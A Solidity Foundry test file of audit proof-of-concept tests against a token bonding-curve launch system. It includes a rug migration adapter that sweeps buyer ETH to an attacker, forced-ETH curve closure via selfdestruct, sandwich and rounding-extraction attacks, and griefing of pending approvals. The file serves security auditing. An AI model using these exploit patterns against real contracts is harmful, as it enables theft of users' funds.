// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {VestingWallet} from "@openzeppelin/contracts/finance/VestingWallet.sol";
import {VOIDBondingCurve} from "../src/VOIDBondingCurve.sol";
import {VOIDCoin} from "../src/VOIDCoin.sol";
import {VOIDLaunch} from "../src/VOIDLaunch.sol";

/// @notice Well-behaved migration target used as the control case.
contract GoodMigrationTarget {
    function migrate(address token, uint256 tokenAmount) external payable {
        IERC20(token).transferFrom(msg.sender, address(this), tokenAmount);
    }
}

/// @notice Migration target that always reverts. Models a broken, self-destructed,
///         paused, or otherwise non-functional adapter at the immutable address.
contract BrokenMigrationTarget {
    function migrate(address, uint256) external payable {
        revert("adapter offline");
    }
}

/// @notice Migration target that keeps everything and provides no liquidity.
///         Satisfies every post-condition graduate() enforces.
contract RugMigrationTarget {
    address public thief;

    constructor(address thief_) {
        thief = thief_;
    }

    function migrate(address token, uint256 tokenAmount) external payable {
        IERC20(token).transferFrom(msg.sender, address(this), tokenAmount);
        IERC20(token).transfer(thief, tokenAmount);
        (bool ok,) = thief.call{value: msg.value}("");
        require(ok, "sweep failed");
    }
}

/// @notice Contract with no code path back to the curve; used to force ETH in.
contract EthForcer {
    function forceTo(address payable target) external payable {
        selfdestruct(target);
    }
}

contract AuditPoCTest is Test {
    address internal safe = makeAddr("safe");
    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");
    address internal attacker = makeAddr("attacker");

    uint256 internal constant VIRTUAL_ETH = 1 ether;
    uint256 internal constant GRAD_THRESHOLD = 10 ether;

    GoodMigrationTarget internal goodTarget;
    VOIDLaunch internal launch;
    VOIDCoin internal token;
    VOIDBondingCurve internal curve;

    function setUp() public {
        goodTarget = new GoodMigrationTarget();
        launch = new VOIDLaunch(safe, address(goodTarget), VIRTUAL_ETH, GRAD_THRESHOLD, "ipfs://genesis");
        token = launch.token();
        curve = launch.bondingCurve();

        vm.deal(alice, 1_000 ether);
        vm.deal(bob, 1_000 ether);
        vm.deal(attacker, 1_000 ether);
    }

    function _acceptSafeOwnership() internal {
        vm.prank(safe);
        token.acceptOwnership();
    }

    // -----------------------------------------------------------------------
    // C-01  Immutable migration target + no rescue path = permanent fund loss
    // -----------------------------------------------------------------------

    function testC01_BrokenAdapterPermanentlyFreezesAllBuyerEth() public {
        BrokenMigrationTarget broken = new BrokenMigrationTarget();
        VOIDLaunch launch2 = new VOIDLaunch(safe, address(broken), VIRTUAL_ETH, GRAD_THRESHOLD, "ipfs://genesis");
        VOIDBondingCurve curve2 = launch2.bondingCurve();
        VOIDCoin token2 = launch2.token();

        vm.prank(alice);
        curve2.buy{value: 6 ether}(0);
        vm.prank(bob);
        curve2.buy{value: 6 ether}(0);

        assertTrue(curve2.graduationReady(), "curve should be closed for trading");
        assertEq(address(curve2).balance, 12 ether, "12 ETH of real buyer money is in the curve");

        // Sells are now permanently closed.
        vm.startPrank(alice);
        token2.approve(address(curve2), type(uint256).max);
        vm.expectRevert(VOIDBondingCurve.CurveClosed.selector);
        curve2.sell(1 ether, 0);
        vm.stopPrank();

        // Graduation is the only exit, and it reverts forever.
        vm.prank(safe);
        vm.expectRevert(VOIDBondingCurve.MigrationFailed.selector);
        curve2.graduate();

        // Time does not help. There is no timeout, no emergency withdraw,
        // no owner setter for migrationTarget (it is immutable).
        vm.warp(block.timestamp + 3650 days);
        vm.prank(safe);
        vm.expectRevert(VOIDBondingCurve.MigrationFailed.selector);
        curve2.graduate();

        assertEq(address(curve2).balance, 12 ether, "12 ETH permanently stranded");
        console2.log("C-01 permanently frozen ETH (wei):", address(curve2).balance);
        console2.log("C-01 permanently frozen VOID:", token2.balanceOf(address(curve2)));
    }

    function testC01_RenounceOwnershipPermanentlyFreezesAllBuyerEth() public {
        vm.prank(alice);
        curve.buy{value: 10 ether}(0);
        assertTrue(curve.graduationReady());

        // Plain Ownable: renounceOwnership() is live and unguarded.
        vm.prank(safe);
        curve.renounceOwnership();
        assertEq(curve.owner(), address(0));

        vm.prank(safe);
        vm.expectRevert();
        curve.graduate();

        assertEq(address(curve).balance, 10 ether, "10 ETH permanently stranded");
    }

    function testC01_MaliciousAdapterPassesEveryPostCondition() public {
        RugMigrationTarget rug = new RugMigrationTarget(attacker);
        VOIDLaunch launch2 = new VOIDLaunch(safe, address(rug), VIRTUAL_ETH, GRAD_THRESHOLD, "ipfs://genesis");
        VOIDBondingCurve curve2 = launch2.bondingCurve();
        VOIDCoin token2 = launch2.token();

        vm.prank(alice);
        curve2.buy{value: 10 ether}(0);

        uint256 attackerEthBefore = attacker.balance;

        vm.prank(safe);
        curve2.graduate(); // succeeds: balance == 0 and tokenReserve == 0

        assertTrue(curve2.graduated());
        assertEq(attacker.balance - attackerEthBefore, 10 ether, "all buyer ETH swept to attacker");
        assertGt(token2.balanceOf(attacker), 0, "all curve tokens swept to attacker");
        console2.log("C-01 rug ETH taken (wei):", attacker.balance - attackerEthBefore);
    }

    // -----------------------------------------------------------------------
    // H-01  Forced ETH closes the curve early and traps sellers
    // -----------------------------------------------------------------------

    function testH01_ForcedEthClosesCurveEarly() public {
        vm.prank(alice);
        curve.buy{value: 1 ether}(0);
        assertFalse(curve.graduationReady());

        // Attacker force-feeds ETH past receive(), which only guards plain calls.
        EthForcer forcer = new EthForcer();
        vm.prank(attacker);
        forcer.forceTo{value: 9 ether}(payable(address(curve)));
        assertEq(address(curve).balance, 10 ether);

        // receive() is still "protected" against ordinary transfers.
        vm.prank(attacker);
        (bool ok,) = address(curve).call{value: 1 wei}("");
        assertFalse(ok, "receive() reverts, but selfdestruct bypasses it");

        // One dust buy latches graduationReady and closes the market forever.
        vm.prank(attacker);
        curve.buy{value: 1 wei}(0);
        assertTrue(curve.graduationReady(), "curve closed at 10 ETH with only ~1 ETH of genuine demand");

        // Alice can no longer exit her position.
        uint256 aliceBal = token.balanceOf(alice);
        vm.startPrank(alice);
        token.approve(address(curve), type(uint256).max);
        vm.expectRevert(VOIDBondingCurve.CurveClosed.selector);
        curve.sell(aliceBal, 0);
        vm.stopPrank();

        console2.log("H-01 tokens still in curve at forced graduation:", token.balanceOf(address(curve)));
    }

    // -----------------------------------------------------------------------
    // H-02  Rounding favours the trader on BOTH sides; curve leaks ETH
    // -----------------------------------------------------------------------

    function testH02_RoundTripExtractsMoreEthThanDeposited() public {
        // Alice provides the liquidity that will be leaked from.
        vm.prank(alice);
        curve.buy{value: 5 ether}(0);

        uint256 curveBefore = address(curve).balance;
        uint256 bobBefore = bob.balance;

        uint256 deposit = 1 ether;
        vm.startPrank(bob);
        uint256 tokensOut = curve.buy{value: deposit}(0);
        token.approve(address(curve), tokensOut);
        uint256 ethOut = curve.sell(tokensOut, 0);
        vm.stopPrank();

        console2.log("H-02 deposited (wei):", deposit);
        console2.log("H-02 returned  (wei):", ethOut);
        assertGt(ethOut, deposit, "atomic buy+sell returns MORE ETH than was deposited");
        assertEq(bob.balance, bobBefore + (ethOut - deposit));
        assertLt(address(curve).balance, curveBefore, "shortfall is paid out of other buyers' ETH");
        console2.log("H-02 curve ETH lost (wei):", curveBefore - address(curve).balance);
    }

    /// @dev Demonstrates that the property `ethOut <= ethIn` — which any correctly
    ///      rounded, fee-less AMM must satisfy — is violated for ALL inputs.
    function testFuzzH02_RoundTripAlwaysReturnsAtLeastTheDeposit(uint96 seedEth, uint96 tradeEth) public {
        uint256 seed = bound(uint256(seedEth), 0.01 ether, 5 ether);
        uint256 trade = bound(uint256(tradeEth), 1 gwei, 1 ether);

        vm.prank(alice);
        curve.buy{value: seed}(0);

        vm.startPrank(bob);
        uint256 tokensOut = curve.buy{value: trade}(0);
        token.approve(address(curve), tokensOut);
        uint256 ethOut = curve.sell(tokensOut, 0);
        vm.stopPrank();

        // The correct assertion for a sound AMM is assertLe(ethOut, trade).
        // It fails on essentially every input. The curve is strictly generous.
        assertGe(ethOut, trade, "expected the curve to always round in the trader's favour");
    }

    function testH02_RepeatedRoundTripsCompoundTheLeak() public {
        vm.prank(alice);
        curve.buy{value: 5 ether}(0);

        uint256 curveBefore = address(curve).balance;
        vm.startPrank(bob);
        for (uint256 i; i < 200; ++i) {
            uint256 out = curve.buy{value: 0.1 ether}(0);
            token.approve(address(curve), out);
            curve.sell(out, 0);
        }
        vm.stopPrank();
        console2.log("H-02 leak after 200 round trips (wei):", curveBefore - address(curve).balance);
        assertLt(address(curve).balance, curveBefore);
    }

    // -----------------------------------------------------------------------
    // H-03  Vesting allocation can be dumped into the curve, draining buyers
    // -----------------------------------------------------------------------

    function testH03_TreasuryCanDrainBuyerEthThroughTheCurve() public {
        vm.prank(alice);
        curve.buy{value: 5 ether}(0);
        vm.prank(bob);
        curve.buy{value: 4 ether}(0);
        uint256 buyerEthIn = 9 ether;
        assertEq(address(curve).balance, buyerEthIn);

        // Half the 12-month schedule elapses; VestingWallet is linear with no cliff.
        VestingWallet vesting = launch.vestingWallet();
        vm.warp(block.timestamp + 183 days);
        vesting.release(address(token));
        uint256 released = token.balanceOf(safe);
        assertGt(released, 49_000_000 ether, "roughly half the treasury is already liquid");

        uint256 safeEthBefore = safe.balance;
        vm.startPrank(safe);
        token.approve(address(curve), released);
        // Sell as much as the curve can honour.
        uint256 sellable = released;
        while (curve.quoteSell(sellable) == 0 || curve.quoteSell(sellable) > address(curve).balance) {
            sellable = sellable / 2;
            if (sellable == 0) break;
        }
        uint256 ethOut = curve.sell(sellable, 0);
        vm.stopPrank();

        console2.log("H-03 treasury tokens sold:", sellable);
        console2.log("H-03 buyer ETH extracted (wei):", ethOut);
        assertGt(ethOut, 0);
        assertEq(safe.balance - safeEthBefore, ethOut);
        assertLt(address(curve).balance, buyerEthIn, "buyer-funded reserve reduced by treasury selling");
    }

    // -----------------------------------------------------------------------
    // H-04  Zero-fee curve makes sandwiching a victim buy unconditionally profitable
    // -----------------------------------------------------------------------

    function testH04_SandwichIsUnconditionallyProfitable() public {
        vm.prank(alice);
        curve.buy{value: 1 ether}(0);

        uint256 victimEth = 1 ether;
        uint256 honestQuote = curve.quoteBuy(victimEth);

        uint256 attackerStart = attacker.balance;

        // Front-run.
        vm.startPrank(attacker);
        uint256 attackerTokens = curve.buy{value: 4 ether}(0);
        vm.stopPrank();

        // Victim executes with minimumTokensOut = 0, as every one of the project's
        // own tests and the quote-then-send front-end pattern do.
        vm.prank(bob);
        uint256 victimTokens = curve.buy{value: victimEth}(0);

        // Back-run.
        vm.startPrank(attacker);
        token.approve(address(curve), attackerTokens);
        curve.sell(attackerTokens, 0);
        vm.stopPrank();

        console2.log("H-04 victim expected tokens:", honestQuote);
        console2.log("H-04 victim received tokens:", victimTokens);
        console2.log("H-04 attacker ETH profit (wei):", attacker.balance - attackerStart);

        assertLt(victimTokens, honestQuote, "victim received fewer tokens than quoted");
        assertGt(attacker.balance, attackerStart, "attacker ends with more ETH than it started with");
    }

    // -----------------------------------------------------------------------
    // M-01  Late sellers cannot exit: sell() reverts instead of partially filling
    // -----------------------------------------------------------------------

    function testM01_LargeHolderCannotExitPosition() public {
        vm.prank(alice);
        uint256 aliceTokens = curve.buy{value: 5 ether}(0);
        vm.prank(bob);
        curve.buy{value: 1 ether}(0);

        // Bob exits first, at Alice's expense.
        vm.startPrank(bob);
        token.approve(address(curve), type(uint256).max);
        curve.sell(token.balanceOf(bob), 0);
        vm.stopPrank();

        vm.startPrank(alice);
        token.approve(address(curve), type(uint256).max);
        // Alice's full position is worth more than the ETH the curve holds.
        vm.expectRevert(VOIDBondingCurve.InsufficientCurveLiquidity.selector);
        curve.sell(aliceTokens, 0);
        vm.stopPrank();

        // quoteSell silently reports 0 rather than reverting, so an integrating
        // front end computing minimumEthOut from the quote sets it to 0.
        assertEq(curve.quoteSell(aliceTokens), 0, "quote returns 0, not a revert");
        console2.log("M-01 curve ETH:", address(curve).balance);
    }

    // -----------------------------------------------------------------------
    // M-02  metadataURI is never bound to the commitment
    // -----------------------------------------------------------------------

    function testM02_SafeCanSubstituteAnyMetadataUri() public {
        _acceptSafeOwnership();
        vm.prank(safe);
        token.setRenamePaused(false);

        // Give the burner tokens off the curve.
        vm.prank(alice);
        curve.buy{value: 5 ether}(0);

        uint256 amount = token.nextBurnRequirement();
        uint256 burnId = token.nextBurnId();
        bytes32 imageHash = keccak256("the-image-the-user-actually-paid-for");
        bytes32 salt = keccak256("salt");
        bytes32 commitment = token.proposalCommitment(burnId, alice, amount, "Good Name", "GOOD", imageHash, salt);

        vm.prank(alice);
        token.burnForRename(amount, commitment);

        // The Safe approves the committed name/symbol/imageHash but points the
        // URI wherever it likes. Nothing on chain links metadataURI to imageHash.
        vm.prank(safe);
        token.approveRename(burnId, "Good Name", "GOOD", "ipfs://completely-unrelated-content", imageHash, salt);

        assertEq(token.name(), "Good Name");
        assertEq(token.tokenURI(), "ipfs://completely-unrelated-content");
        console2.log("M-02 burner paid (VOID):", amount);
        console2.log("M-02 resulting URI:", token.tokenURI());
    }

    // -----------------------------------------------------------------------
    // M-03  Ownership handoff can strand the token with a contract that cannot act
    // -----------------------------------------------------------------------

    function testM03_UnacceptedOwnershipPermanentlyDisablesRenaming() public {
        // The Safe never calls acceptOwnership().
        assertEq(token.owner(), address(launch), "VOIDLaunch is still owner");
        assertEq(token.pendingOwner(), safe);
        assertTrue(token.renamePaused(), "constructor leaves renaming paused");

        // The Safe cannot use owner powers until it accepts.
        vm.prank(safe);
        vm.expectRevert();
        token.setRenamePaused(false);

        // And VOIDLaunch can never exercise them either: it is a constructor-only
        // contract. It exposes three getters and nothing else, no fallback, and no
        // way to originate an external call. Every non-getter selector reverts.
        (bool ok1,) = address(launch).call(abi.encodeWithSignature("setRenamePaused(bool)", false));
        assertFalse(ok1, "VOIDLaunch has no owner-call forwarding surface");
        (bool ok2,) = address(launch).call(abi.encodeWithSignature("acceptOwnership()"));
        assertFalse(ok2);
        (bool ok3,) = address(launch).call(hex"deadbeef");
        assertFalse(ok3, "no fallback");

        // Therefore, until the Safe executes acceptOwnership(), the token's owner
        // is an address that provably cannot ever call an onlyOwner function, and
        // renaming stays paused with no path to unpause.
        assertTrue(token.renamePaused());
    }

    // -----------------------------------------------------------------------
    // M-04  Third party can grief the Safe's approval transaction
    // -----------------------------------------------------------------------

    function testM04_SupersedingBurnRevertsPendingSafeApproval() public {
        _acceptSafeOwnership();
        vm.prank(safe);
        token.setRenamePaused(false);

        vm.prank(alice);
        curve.buy{value: 20 ether}(0); // alice ends up with plenty of VOID
        vm.prank(alice);
        token.transfer(attacker, 50_000_000 ether);

        uint256 amount = token.nextBurnRequirement();
        uint256 burnId = token.nextBurnId();
        bytes32 imageHash = keccak256("img");
        bytes32 salt = keccak256("salt");
        bytes32 commitment = token.proposalCommitment(burnId, alice, amount, "Alice Name", "ALICE", imageHash, salt);

        vm.prank(alice);
        token.burnForRename(amount, commitment);

        // Safe queues approveRename. Attacker front-runs the execution.
        uint256 nextReq = token.nextBurnRequirement();
        vm.prank(attacker);
        token.burnForRename(nextReq, keccak256("attacker-commitment"));

        vm.prank(safe);
        vm.expectRevert(VOIDCoin.CommitmentMismatch.selector);
        token.approveRename(burnId, "Alice Name", "ALICE", "ipfs://alice", imageHash, salt);

        // Alice's 1,000,000 VOID is gone and she never got her rename.
        assertEq(token.recordBurner(), attacker);
        console2.log("M-04 alice burned and lost (VOID):", amount);
    }

    function testM04_BurnerCanGriefTheSafeByReplacingTheCommitment() public {
        _acceptSafeOwnership();
        vm.prank(safe);
        token.setRenamePaused(false);
        vm.prank(alice);
        curve.buy{value: 5 ether}(0);

        uint256 amount = token.nextBurnRequirement();
        uint256 burnId = token.nextBurnId();
        bytes32 imageHash = keccak256("img");
        bytes32 salt = keccak256("salt");
        bytes32 commitment = token.proposalCommitment(burnId, alice, amount, "Alice Name", "ALICE", imageHash, salt);

        vm.prank(alice);
        token.burnForRename(amount, commitment);

        // Alice front-runs the Safe's execution with a no-cost commitment swap.
        vm.prank(alice);
        token.replaceCommitment(keccak256("swapped"));

        vm.prank(safe);
        vm.expectRevert(VOIDCoin.CommitmentMismatch.selector);
        token.approveRename(burnId, "Alice Name", "ALICE", "ipfs://alice", imageHash, salt);
    }

    // -----------------------------------------------------------------------
    // M-05  No expiry / cancel: an unapprovable slot has no owner-side clear
    // -----------------------------------------------------------------------

    function testM05_OwnerCannotClearAnUnapprovableSlot() public {
        _acceptSafeOwnership();
        vm.prank(safe);
        token.setRenamePaused(false);
        vm.prank(alice);
        curve.buy{value: 5 ether}(0);

        // Alice commits to a name that can never pass _validName (16 chars).
        uint256 amount = token.nextBurnRequirement();
        uint256 burnId = token.nextBurnId();
        bytes32 salt = keccak256("s");
        bytes32 imageHash = keccak256("i");
        bytes32 commitment = token.proposalCommitment(burnId, alice, amount, "SixteenCharsXXXX", "SYM", imageHash, salt);
        vm.prank(alice);
        token.burnForRename(amount, commitment);

        vm.prank(safe);
        vm.expectRevert(VOIDCoin.InvalidName.selector);
        token.approveRename(burnId, "SixteenCharsXXXX", "SYM", "ipfs://x", imageHash, salt);

        // openedAt is recorded but never read; nothing expires.
        assertEq(token.activeSlot().openedAt, uint64(block.timestamp));
        vm.warp(block.timestamp + 3650 days);
        assertEq(token.activeSlot().burner, alice, "slot never expires");

        // The owner has no clearActiveSlot(); only a larger burn displaces it.
        // Pausing does not clear it either.
        vm.prank(safe);
        token.setRenamePaused(true);
        assertEq(token.activeSlot().burner, alice);
    }

    // -----------------------------------------------------------------------
    // L-01  VOIDLaunch does not validate that migrationTarget has code
    // -----------------------------------------------------------------------

    function testL01_LaunchAcceptsAnEoaMigrationTarget() public {
        address eoa = makeAddr("eoa-typo-address");
        assertEq(eoa.code.length, 0);

        // Constructor accepts it happily. Only the off-chain script checks code.
        VOIDLaunch launch2 = new VOIDLaunch(safe, eoa, VIRTUAL_ETH, GRAD_THRESHOLD, "ipfs://genesis");
        VOIDBondingCurve curve2 = launch2.bondingCurve();
        assertEq(curve2.migrationTarget(), eoa);

        vm.prank(alice);
        curve2.buy{value: 10 ether}(0);

        // graduate() reverts with EMPTY data, not MigrationFailed: solc's
        // extcodesize preamble for the try-call fires before the try body, so the
        // catch block never runs and the custom error is never produced.
        vm.prank(safe);
        vm.expectRevert(bytes(""));
        curve2.graduate();
        assertEq(address(curve2).balance, 10 ether, "funds frozen forever");
    }

    // -----------------------------------------------------------------------
    // L-02  Rename requirement escalates until the mechanism self-terminates
    // -----------------------------------------------------------------------

    function testL02_RenameMechanismSelfTerminates() public {
        _acceptSafeOwnership();
        vm.prank(safe);
        token.setRenamePaused(false);

        uint256 n;
        uint256 cumulative;
        while (true) {
            uint256 req = (n + 1) * 1_000_000 ether;
            if (cumulative + req > 1_000_000_000 ether) break;
            cumulative += req;
            ++n;
        }
        console2.log("L-02 max lifetime renames before supply exhaustion:", n);
        console2.log("L-02 cumulative burn at that point (VOID):", cumulative);
        assertLt(n, 50);
    }

    // -----------------------------------------------------------------------
    // I-01  VestingWallet is linear from t=0 with no cliff and is renounceable
    // -----------------------------------------------------------------------

    function testI01_VestingHasNoCliffAndUnlocksFromDayOne() public {
        VestingWallet vesting = launch.vestingWallet();
        vm.warp(block.timestamp + 1 days);
        vesting.release(address(token));
        uint256 dayOne = token.balanceOf(safe);
        assertGt(dayOne, 250_000 ether, "over 250k VOID liquid after a single day");
        console2.log("I-01 VOID released after 1 day:", dayOne);

        // The beneficiary can also renounce, permanently bricking the allocation.
        vm.prank(safe);
        vesting.renounceOwnership();
        assertEq(vesting.owner(), address(0));
    }

    // -----------------------------------------------------------------------
    // Invariant that the existing suite is missing entirely
    // -----------------------------------------------------------------------

    function testInvariant_CurveEthNeverExceedsNetDeposits() public {
        uint256 netDeposits;

        vm.prank(alice);
        curve.buy{value: 3 ether}(0);
        netDeposits += 3 ether;

        vm.startPrank(bob);
        uint256 out = curve.buy{value: 2 ether}(0);
        netDeposits += 2 ether;
        token.approve(address(curve), out);
        uint256 back = curve.sell(out, 0);
        netDeposits -= back;
        vm.stopPrank();

        // This is the property that should hold and does not.
        assertGe(address(curve).balance, netDeposits, "curve holds less ETH than net deposits");
    }
}

